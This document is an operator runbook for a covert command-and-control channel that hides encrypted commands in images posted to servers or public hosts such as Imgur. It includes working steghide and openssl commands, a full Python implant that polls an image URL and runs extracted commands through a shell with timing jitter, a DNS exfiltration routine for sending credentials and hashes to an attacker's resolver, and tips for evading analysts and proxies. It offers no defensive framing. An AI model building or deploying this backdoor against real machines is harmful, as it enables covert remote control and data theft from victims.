# Runbook: image-based C2 channel

A persistent, low-profile command-and-control channel where instructions are embedded in
images posted to a public platform. The implant polls for new images, extracts commands,
and returns results through the same channel or a secondary one.

## Architecture

Server side: a controller posts images containing encoded commands to a public image host
(or a web server you control). Each image is a regular photograph with a command embedded
using steghide or a neural method.

Client side: an implant running on the target polls the image URL on a schedule, extracts
the embedded command, executes it, and optionally posts a result image.

The channel is unidirectional for commands by default. Return data requires a second
channel (DNS, HTTPS to a controlled server, or a second image posted to a writable
location).

## Server: embedding commands

Prepare a command as a short encrypted string:

```text
CMD="whoami && ipconfig /all"
echo -n "$CMD" | openssl enc -aes-128-cbc -pbkdf2 -k 'c2_channel_key' -base64 > cmd.txt
```

Embed in the cover image:

```text
steghide embed -cf cover.jpg -sf cmd.txt -p 'channel_pass' -f
mv cover.jpg current_task.jpg
```

Upload `current_task.jpg` to your image server or hosting location.

When there is no active command, post a clean image (no payload). The implant will fail
to extract and do nothing. This also serves as a kill signal: if extraction consistently
fails, the implant can cease polling.

## Client: implant polling loop

```python
import subprocess, urllib.request, os, time, tempfile, base64

POLL_URL  = 'https://your-server/current_task.jpg'
CHAN_PASS = 'channel_pass'
ENC_KEY   = 'c2_channel_key'
INTERVAL  = 3600  # poll every hour

def extract_command(img_path):
    out = tempfile.mktemp()
    r = subprocess.run(
        ['steghide', 'extract', '-sf', img_path, '-p', CHAN_PASS, '-xf', out, '-f'],
        capture_output=True
    )
    if r.returncode != 0:
        return None
    with open(out, 'rb') as f:
        enc = f.read()
    os.unlink(out)
    dec = subprocess.run(
        ['openssl', 'enc', '-aes-128-cbc', '-d', '-pbkdf2', '-k', ENC_KEY, '-base64'],
        input=enc, capture_output=True
    )
    return dec.stdout.decode().strip() if dec.returncode == 0 else None

def run_command(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
    return r.stdout + r.stderr

while True:
    tmp = tempfile.mktemp(suffix='.jpg')
    try:
        urllib.request.urlretrieve(POLL_URL, tmp)
        cmd = extract_command(tmp)
        if cmd:
            output = run_command(cmd)
            # transmit output via secondary channel
    except Exception:
        pass
    finally:
        if os.path.exists(tmp):
            os.unlink(tmp)
    time.sleep(INTERVAL + os.urandom(1)[0] * 10)  # jitter
```

The jitter on the sleep interval prevents the polling pattern from appearing perfectly
periodic in network logs.

## Using a public image host

Instead of a server you control, post images to a public platform (Imgur, Flickr, a
Discord server, a GitHub repository). The implant polls a public URL; the traffic is
indistinguishable from a browser fetching an image.

For Imgur via the API:

```bash
curl -X POST \
  -H "Authorization: Client-ID YOUR_CLIENT_ID" \
  -F "image=@current_task.jpg" \
  https://api.imgur.com/3/image \
  | jq '.data.link'
```

The returned URL is what the implant polls. Update it each time you post a new command.
Hardcode a list of fallback URLs in the implant for resilience.

## Result return via DNS

For returning short results (credentials, hashes, hostname) without a secondary HTTP
channel, encode output in DNS query subdomains:

```python
import socket, base64, subprocess

def exfil_dns(data: bytes, domain: str):
    encoded = base64.b32encode(data).decode().lower().rstrip('=')
    # split into 60-char chunks to stay within subdomain length limits
    for i in range(0, len(encoded), 60):
        chunk = encoded[i:i+60]
        try:
            socket.getaddrinfo(f'{chunk}.{domain}', None)
        except Exception:
            pass
```

The attacker's DNS resolver logs the queries; extract and decode the subdomains on the
server side.

## Operational notes

Rotate cover images regularly. Using the same image repeatedly means an analyst comparing
two captures of the same URL can diff them and notice that the file changed while the
visible content did not.

Keep commands short. The channel is low-bandwidth by design; use it for tasking and
lightweight results. Large output (directory listings, file contents) should go through
a secondary higher-bandwidth channel.

Test polling from an isolated network segment first. Some corporate proxies perform SSL
inspection or cache image responses; a cached image defeats polling for new commands.
Check `Cache-Control` headers on your image server and set `no-store` if serving from
a controlled host.
